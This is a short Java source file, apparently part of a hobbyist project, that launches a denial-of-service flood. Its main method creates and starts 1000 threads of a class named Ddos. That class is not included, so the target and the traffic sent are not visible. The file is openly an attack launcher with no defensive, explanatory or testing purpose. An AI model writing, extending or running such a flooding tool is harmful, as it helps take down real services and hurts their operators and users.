package nsotien.main;/*
java by nsotien tv .......
Name : nsotien
Time : 1:35 PM
Date : 10/29/22
*/

import nsotien.model.Ddos;

public class RunDdos {
    public static void main(String[] args) {
        Thread[] threadArr = new Thread[1000];
        for (int i = 0; i < 1000; i++) {
            threadArr[i] = new Ddos();
        }
        for (Thread x : threadArr) {
            x.start();
        }
    }
}
